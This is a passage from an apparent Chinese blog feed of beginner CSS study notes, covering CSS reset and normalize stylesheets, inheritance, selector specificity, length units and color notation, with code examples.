class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">16px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>去除列表前的黑点<br><img data-src="https://www.tupians.top/imgs/2022/01/5fe53db7e5497a4a.png" alt=""><br>再将之前加的 16px 的 <code>margin-left</code>  样式去除</li><li><img data-src="https://www.tupians.top/imgs/2022/01/30fc99b97ba05166.png" alt="">到这里似乎就大功告成了，但是我们会发现写法似乎 很完美 有点麻烦<br>有没有简化空间了呢？<br>答案是肯定的，我们前面介绍过通配选择器的概念，可以直接简化成一个</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* margin-left: 16px; */</span></span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>简化写法<br>效果是一样的</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去除浏览器的默认样式的需求是非常普遍的，我们难道每次都需要手动去除浏览器的默认样式？</p><p>这样岂不是很麻烦，难道官方就没有想到解决方案吗？</p><p>答案也是肯定的，有！</p><p>正因为上述冲突和问题依然存在于这个” 不完美的世界”，所以一些设计师想到了一种避免浏览器兼容性问题的方法，那就是 CSS Reset</p><p>什么是 CSS Reset？</p><p>我们可以把它叫做 CSS 重设，也有人叫做 CSS 复位、默认 CSS、CSS 重置等。</p><p>CSS 重设就是先定义好一些 CSS 样式，来让所有浏览器都按照同样的规则解释 CSS，这样就能避免发生这种问题。</p><p>下方两种 css 样式，我们引入其中一个即可</p><h3 id="reset样式"><a class="markdownIt-Anchor" href="#reset样式">#</a> reset 样式</h3><p>官方地址：<span class="exturl" data-url="aHR0cHM6Ly9tZXllcndlYi5jb20vZXJpYy90b29scy9jc3MvcmVzZXQv">reset.css</span></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;assets/reset.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://www.tupians.top/imgs/2022/01/8995f28f046d4d18.png" alt=""></p><p>我们可以看到 reset.css 的作用就是将各个内外边距置为 0，将一些样式置为 none</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* http://meyerweb.com/eric/tools/css/reset/ </span></span><br><span class="line"><span class="comment">   v2.0 | 20110126</span></span><br><span class="line"><span class="comment">   License: none (public domain)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">html</span>, <span class="selector-tag">body</span>, <span class="selector-tag">div</span>, <span class="selector-tag">span</span>, applet, <span class="selector-tag">object</span>, <span class="selector-tag">iframe</span>,</span><br><span class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span>, <span class="selector-tag">p</span>, <span class="selector-tag">blockquote</span>, pre,</span><br><span class="line"><span class="selector-tag">a</span>, <span class="selector-tag">abbr</span>, acronym, <span class="selector-tag">address</span>, big, <span class="selector-tag">cite</span>, <span class="selector-tag">code</span>,</span><br><span class="line"><span class="selector-tag">del</span>, <span class="selector-tag">dfn</span>, <span class="selector-tag">em</span>, <span class="selector-tag">img</span>, <span class="selector-tag">ins</span>, <span class="selector-tag">kbd</span>, <span class="selector-tag">q</span>, s, <span class="selector-tag">samp</span>,</span><br><span class="line">small, strike, <span class="selector-tag">strong</span>, sub, <span class="selector-tag">sup</span>, tt, <span class="selector-tag">var</span>,</span><br><span class="line"><span class="selector-tag">b</span>, u, <span class="selector-tag">i</span>, center,</span><br><span class="line"><span class="selector-tag">dl</span>, <span class="selector-tag">dt</span>, <span class="selector-tag">dd</span>, <span class="selector-tag">ol</span>, <span class="selector-tag">ul</span>, <span class="selector-tag">li</span>,</span><br><span class="line"><span class="selector-tag">fieldset</span>, <span class="selector-tag">form</span>, <span class="selector-tag">label</span>, <span class="selector-tag">legend</span>,</span><br><span class="line"><span class="selector-tag">table</span>, <span class="selector-tag">caption</span>, <span class="selector-tag">tbody</span>, <span class="selector-tag">tfoot</span>, <span class="selector-tag">thead</span>, <span class="selector-tag">tr</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span>,</span><br><span class="line"><span class="selector-tag">article</span>, <span class="selector-tag">aside</span>, <span class="selector-tag">canvas</span>, <span class="selector-tag">details</span>, embed, </span><br><span class="line"><span class="selector-tag">figure</span>, <span class="selector-tag">figcaption</span>, <span class="selector-tag">footer</span>, <span class="selector-tag">header</span>, <span class="selector-tag">hgroup</span>, </span><br><span class="line"><span class="selector-tag">menu</span>, <span class="selector-tag">nav</span>, output, ruby, <span class="selector-tag">section</span>, <span class="selector-tag">summary</span>,</span><br><span class="line"><span class="selector-tag">time</span>, <span class="selector-tag">mark</span>, <span class="selector-tag">audio</span>, <span class="selector-tag">video</span> &#123;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">font</span>: inherit;</span><br><span class="line"><span class="attribute">vertical-align</span>: baseline;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* HTML5 display-role reset for older browsers */</span></span><br><span class="line"><span class="selector-tag">article</span>, <span class="selector-tag">aside</span>, <span class="selector-tag">details</span>, <span class="selector-tag">figcaption</span>, <span class="selector-tag">figure</span>, </span><br><span class="line"><span class="selector-tag">footer</span>, <span class="selector-tag">header</span>, <span class="selector-tag">hgroup</span>, <span class="selector-tag">menu</span>, <span class="selector-tag">nav</span>, <span class="selector-tag">section</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">line-height</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ol</span>, <span class="selector-tag">ul</span> &#123;</span><br><span class="line"><span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">blockquote</span>, <span class="selector-tag">q</span> &#123;</span><br><span class="line"><span class="attribute">quotes</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">blockquote</span>:before, blockquote:after,</span><br><span class="line">q:before, q:after &#123;</span><br><span class="line">content: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="attribute">content</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">table</span> &#123;</span><br><span class="line"><span class="attribute">border-collapse</span>: collapse;</span><br><span class="line"><span class="attribute">border-spacing</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="normalize样式"><a class="markdownIt-Anchor" href="#normalize样式">#</a> normalize 样式</h3><p>官方地址：<span class="exturl" data-url="aHR0cHM6Ly9uZWNvbGFzLmdpdGh1Yi5pby9ub3JtYWxpemUuY3NzLzguMC4xL25vcm1hbGl6ZS5jc3M=">normalize.css</span></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;assets/normalize<span class="selector-class">.css</span>&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://www.tupians.top/imgs/2022/01/adb5142e24d23d3e.png" alt=""></p><p>这里并没有去除所有样式，因为 normalize 的作用不同于 reset。reset 是将所有默认样式去除，而 normalize 是将所有默认样式统一，这样在不同的浏览器里显示效果也是统一的</p><p>至于文件内容就不再这里赘述了，感兴趣的可以仔细研究</p><hr><p><strong>参考资料</strong></p><hr><ol><li><p>CSS 盒子模型：<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9DU1MlRTclOUIlOTIlRTUlQUQlOTAlRTYlQTglQTElRTUlOUUlOEIvOTgxNDU2Mj9mcj1hbGFkZGlu">https://baike.baidu.com/item/CSS 盒子模型 / 9814562?fr=aladdin</span> <a href="#fnref1">↩︎</a></p></li><li><p>谷歌、火狐浏览器 缩放为 80% 时，margin 值才正确：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGFvaHVheWEvcC83NjQyNzQyLmh0bWw=">https://www.cnblogs.com/taohuaya/p/7642742.html</span> <a href="#fnref2">↩︎</a></p></li><li><p>内边距的设置会影响到盒子的大小，背景颜色会延伸到内边距上 <a href="#fnref3">↩︎</a></p></li><li><p>margin (子元素远离父元素边框)：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRmxGdEZ3L3AvOTYyNzAyNi5odG1s">https://www.cnblogs.com/FlFtFw/p/9627026.html</span> <a href="#fnref4">↩︎</a></p></li><li><p>目前比较全的 CSS 重设 (reset) 方法总结：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaG55ZWkvYXJjaGl2ZS8yMDExLzEwLzA0LzIxOTg3NzkuaHRtbA==">https://www.cnblogs.com/hnyei/archive/2011/10/04/2198779.html</span> <a href="#fnref5">↩︎</a> <a href="#fnref5:1">↩︎</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;盒模型&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#盒模型&quot;&gt;#&lt;/a&gt; 盒模型&lt;/h1&gt;
&lt;p&gt;笔记来源：&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29t</summary>
      
    
    
    
    <category term="web前端" scheme="https://sun-spots.github.io/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>css样式、继承、权重</title>
    <link href="https://sun-spots.github.io/2022/01/14/%E4%BF%AE%E6%94%B9/css%E6%A0%B7%E5%BC%8F%E3%80%81%E7%BB%A7%E6%89%BF%E3%80%81%E6%9D%83%E9%87%8D/"/>
    <id>https://sun-spots.github.io/2022/01/14/%E4%BF%AE%E6%94%B9/css%E6%A0%B7%E5%BC%8F%E3%80%81%E7%BB%A7%E6%89%BF%E3%80%81%E6%9D%83%E9%87%8D/</id>
    <published>2022-01-14T11:59:12.000Z</published>
    <updated>2022-01-15T08:56:22.721Z</updated>
    
    <content type="html"><![CDATA[<h1 id="css样式-继承-与选择器的权重"><a class="markdownIt-Anchor" href="#css样式-继承-与选择器的权重">#</a> CSS 样式、继承、与选择器的权重</h1><h2 id="1-继承"><a class="markdownIt-Anchor" href="#1-继承">#</a> 1. 继承</h2><p>当我们在为一个标签指定其属性时，同时它的后代元素也会应用到相应的元素，这种现象称为 CSS 的继承。继承是发生在祖先后后代之间的，继承的设计是为了方便我们的开发。（需要为后代的某些元素指定单独的属性时，单独声明即可）利用继承，我们可以将一些通用的样式，统一设置到共同的祖先元素上。这样只需设置一次即可让所有的元素都具有该样式</p><p>注意，并不是所有的样式都会被继承：</p><ul><li>比如背景相关的，布局相关等的这些样式都不会被继承。（列如：背景颜色。背景图片等）</li></ul><p>​       我们可以再 Zeal 手册中，搜索 <code>background-color</code>  属性，可以看到一个定义的表格。其中就说明了其不可被继承性</p><ul><li>常用的 css 不可继承的属性：</li></ul><p>display：规定元素应该生成的框的类型</p><p>text-decoration：规定添加到文本的装饰</p><p>text-shadow：文本阴影效果</p><p>white-space：空白符的处理</p><p>盒子模型的属性：width、height、margin 、border、padding</p><p>背景属性：background</p><p>定位属性：float、clear、position、top、right、bottom、left、min-width、min-height、max-width、max-height、overflow、clip、z-index</p><h2 id="2-选择器的权重"><a class="markdownIt-Anchor" href="#2-选择器的权重">#</a> 2. 选择器的权重</h2><p>当我们通过不同的选择器，选中相同的元素，并且为相同的样式设置不同的值时，此时就发生了样式的冲突。</p><p><strong>权重：!important &gt; 行内样式 &gt; ID 选择器 &gt; 类选择器 &gt; 标签 &gt; 通配符 &gt; 继承 &gt; 浏览器默认属性。</strong></p><p>发生样式冲突时，应用哪个样式由选择器的权重（优先级）决定选择器的权重</p><table><thead><tr><th>选择器</th><th>权重</th></tr></thead><tbody><tr><td>内联样式</td><td>1, 0, 0, 0</td></tr><tr><td>ID 选择器</td><td>0, 1, 0, 0</td></tr><tr><td>类和伪类选择器</td><td>0, 0, 1, 0</td></tr><tr><td>元素选择器</td><td>0, 0, 0, 1</td></tr><tr><td>通配选择器</td><td>0, 0, 0, 0</td></tr><tr><td>继承的样式</td><td>没有优先级</td></tr></tbody></table><p>比较优先级时，需要将所有的选择器的优先级进行相加计算，最后优先级越高，则越优先显示（<strong>分组选择器是单独计算的，组合选择器相加，相加的结果不会超过它前面的选择器的优先级）</strong></p><p><strong>选择器的累加不会超过其最大的数量级，类选择器再高也不会超过 ID 选择器</strong>如果优先级计算后相同，此时则优先使用靠下的样式</p><p>可以在某一个样式的后边添加 <code>!important</code> ，则此时该样式会获取到最高的优先级，甚至超过内联样式，注意：在开发中一定要慎用！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    #box1&#123;</span><br><span class="line">        background-color: orange;</span><br><span class="line">    &#125;</span><br><span class="line">    div&#123;</span><br><span class="line">        background-color: yellow;</span><br><span class="line">    &#125;</span><br><span class="line">    .red&#123;</span><br><span class="line">        background-color: red;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;box1&quot; class=&quot;red&quot; style=&quot;background-color: skyblue;&quot;&gt;选择器的权重&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="3-长度单位"><a class="markdownIt-Anchor" href="#3-长度单位">#</a> 3. 长度单位</h2><h3 id="像素"><a class="markdownIt-Anchor" href="#像素">#</a> 像素</h3><p>我们先来看下某度上关于像素（pixel, 缩写 px）的介绍</p><p>像素是指由图像的小方格组成的，这些小方块都有一个明确的位置和被分配的色彩数值，小方格颜色和位置就决定该图像所呈现出来的样子。</p><p>可以将像素视为整个图像中不可分割的单位或者是元素。不可分割的意思是它不能够再切割成更小单位抑或是元素，它是以一个单一颜色的小格存在 [1] 。每一个点阵图像包含了一定量的像素，这些像素决定图像在屏幕上所呈现的大小。</p><p>也就是说，显示器屏幕实际上是由一个一个的小点（单位色块，即像素）构成的</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/f14c7aaed2f7e7f5.gif" alt=""></p><p><strong>问题 1：像素和分辨率有什么关系呢？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分辨率 = 水平方向像素 * 垂直方向像素</span><br></pre></td></tr></table></figure><h4 id="屏幕分辨率"><a class="markdownIt-Anchor" href="#屏幕分辨率">#</a> 屏幕分辨率</h4><p>例如，屏幕分辨率是 1920×1080，则该屏幕水平方向有 1920 个像素，垂直方向有 1080 个像素</p><ul><li><p>不同屏幕的像素大小是不同的，也就是说像素大小不像我们现行的长度单位（如米 /m）那样有着固定的国际标准</p></li><li><p>所以同样的像素大小在不同的设备上显示效果是不一样的，像素越小的屏幕显示的效果越清晰</p></li></ul><h4 id="图像分辨率"><a class="markdownIt-Anchor" href="#图像分辨率">#</a> 图像分辨率</h4><p>例如，一张图片分辨率是 300x200，则该图片在屏幕上按 1:1 缩放时，水平方向有 300 个像素，垂直方向有 200 个像素点</p><ul><li><p>图片分辨率越高，1:1 缩放时面积越大</p></li><li><p>图片分辨率越低，1:1 缩放时面积越小</p></li></ul><p>同一台设备像素大小是不变的，那把图片放大超过 100% 时占的像素点就多了，但是图像也会变得模糊</p><p><strong>问题 2：屏幕实现图片放大或缩小的原理是什么呢？</strong></p><ul><li><p>其实是设备通过算法对图像进行了像素补足；</p></li><li><p>同理，把图片按小于 100% 缩放时，也是通过算法将图片像素减少</p></li></ul><h3 id="百分比"><a class="markdownIt-Anchor" href="#百分比">#</a> 百分比</h3><p>也可以将属性值设置为相对于其父元素属性的百分比，此时子元素的大小相对于其父元素的属性发生相对的变化（暂且先理解成父元素，后面会详细说）的改变而改变</p><h3 id="em"><a class="markdownIt-Anchor" href="#em">#</a> em</h3><p>em 是相对于元素的字体大小来计算的， <code>1em = &lt;self&gt;.font-size * 10</code> ，也就说 em 值会根据元素本身的字体大小的改变而改变（此处的字体大小为自己标签或其父标签所指定的字体的大小）</p><h3 id="rem"><a class="markdownIt-Anchor" href="#rem">#</a> rem</h3><p>rem 是相对于根元素的字体大小来计算， <code>1em = &lt;root&gt;.font-size * 10</code> ，也就说 em 值会根据根元素的字体大小的改变而改变（此处的字体大小整个页面的字体【或者是<html>所指定的】的字体的大小）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    * &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    </span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>; </span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box2</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">50%</span>; </span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">50%</span>; </span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: aqua;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    </span></span><br><span class="line"><span class="css">    <span class="selector-class">.box3</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">10em</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">10em</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: greenyellow;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    </span></span><br><span class="line"><span class="css">    <span class="selector-class">.box4</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">10rem</span>; <span class="comment">/*当时用rem时，不管怎么改本元素的font-size都是不会变的。需要定义root元素的font-size才可以 */</span></span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">10rem</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><img data-src="https://s3.bmp.ovh/imgs/2022/01/54054df3a36b7ed2.png" style="zoom:50%;" /><h2 id="4-颜色单位"><a class="markdownIt-Anchor" href="#4-颜色单位">#</a> 4. 颜色单位</h2><p><strong>css 中的颜色名称</strong></p><p>我们生活中会使用各种颜色名称去描述看到的各种颜色，在 css 中当然也可以直接使用颜色名来设置颜色，比如：red、orange、yellow、blue、green 等等其中有 140 种颜色名称是所有浏览器都支持的，但是有个问题，就是在 css 中直接使用颜色名非常不方便</p><p>而且世界上有无数种颜色，人眼也不能分辨出所有颜色，更不可能对每一种颜色都进行命名而且就算能够有办法对那么多种颜色进行命名，我们也不可能一个一个的去记或去查这种对应关系。试问下，有多少人看一眼某个颜色，就能够在调色板上快速准确的定位那个颜色或者直接叫出那种颜色的名称？这显然不现实，至少现在如此另外，那么 css 中还可以怎么调和出更多的颜色呢？</p><p>在介绍 css 的颜色单位之前，我们首先来了解下光的三原色，因为 css 的颜色就是按照光的三原色来调和的发现光的色散奥妙之后，牛顿开始推论：既然白光能被分解及合成，那么这七种色光是否也可以被分解或合成。于是，纷繁的实验和不停的计算充斥着他日后的生活。一段时间后，牛顿通过计算，得出了一个结论：七种色光中只有红、绿、蓝三种色光无法被分解，于是也就谈不到合成了。而其他四种色光均可由这三种色光以不同比例相合而成。于是红、绿、蓝则被称为 “三原色光” 或 “光的三原色”（注意，这有别于我们熟知的三原色 “红黄蓝”）。牛顿通过计算得出上述结论后，未能完成实验，便与世长辞。这里再科普下光的三原色和颜料的三原色的区别</p><p><strong>颜料三原色</strong>（CMYK）：品红、黄、青 (天蓝)。色彩三原色可以混合出所有颜料的颜色，同时相加为黑色，黑白灰属于无色系。</p><p><strong>光学三原色</strong>（RGB）：红、绿、蓝 (靛蓝)。光学三原色混合后，组成显示屏显示颜色，三原色同时相加为白色，白色属于无色系（黑白灰）中的一种。</p><p>那看到这里有人会问了，<strong>css 为什么不按照颜料的三原色来调和呢？</strong></p><p>因为道理很简单，聪明的小伙伴应该已经知道答案了。上面我们也说过，屏幕是由像素组成的，每个像素就是一个单位色块。而这个单位色块之所以能显示颜色，就是靠发光来实现的既然光是由三种色光组成的，任何一种颜色均可以由这三种颜色调和出来的，那么为什么我们不能用三原色来表示一种颜色呢？</p><h3 id="rgb值"><a class="markdownIt-Anchor" href="#rgb值">#</a> RGB 值</h3><p>RGB 通过三原色的不同浓度来调配出不同的颜色</p><ul><li><p>语法： <code>RGB(red, green, blue)</code></p></li><li><p>范围：每一种颜色的范围在 0 ~ 255（0% ~ 100%）之间</p></li></ul><h3 id="rgba"><a class="markdownIt-Anchor" href="#rgba">#</a> RGBA</h3><p>就是在 rgb 的基础上增加了一个 a 表示不透明度</p><ul><li><p><code>1</code>  表示完全不透明</p></li><li><p><code>0</code>  表示完全透明</p></li><li><p><code>.5</code>  半透明</p></li></ul><h3 id="十六进制的rgb值"><a class="markdownIt-Anchor" href="#十六进制的rgb值">#</a> 十六进制的 RGB 值</h3><p>就是 RGB 值的十六进制写法</p><ul><li><p>语法： <code>#RRGGBB</code></p></li><li><p>范围：每一种颜色的范围在 00 ~ ff 之间</p></li></ul><p>如果颜色两位两位重复可以进行简写，如 <code>#aabbcc</code>  =&gt;  <code>#abc</code></p><p>在 vscode 中，我们可以看到其会对颜色进行预览展示。并且将鼠标移至 color 处悬浮，会智能的弹出一个 rgb 调色板，方便我们进行调色</p><p>如果我们看到某种颜色，非常喜欢，那么在哪里才能买得到呢？ 怎么知道这个颜色的 rgb 值呢？</p><p>我们可以直接搜索黄色，哦不是，取色器！有些录制软件也会自带取色功能，如 FastStone Capture</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/e68cd06581d58c87.png" alt=""></p><p>下载地址：<span class="exturl" data-url="aHR0cHM6Ly9mYXN0c3RvbmUtY2FwdHVyZS5lbi5zb2Z0b25pYy5jb20v">FastStone Capture - Download</span></p><p>笔记来源：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVhKNDExWDdVZA==">尚硅谷 Web 前端 HTML5&amp;CSS3 初学者零基础入门全套完整版</span></p><p>​<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL3UyMTE5NTE4My9oZmNhbWcvc2djZzU0">https://www.yuque.com/u21195183/hfcamg/sgcg54</span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;css样式-继承-与选择器的权重&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#css样式-继承-与选择器的权重&quot;&gt;#&lt;/a&gt; CSS 样式、继承、与选择器的权重&lt;/h1&gt;
&lt;h2 id=&quot;1-继承&quot;&gt;&lt;a class=&quot;markdow</summary>
      
    
    
    
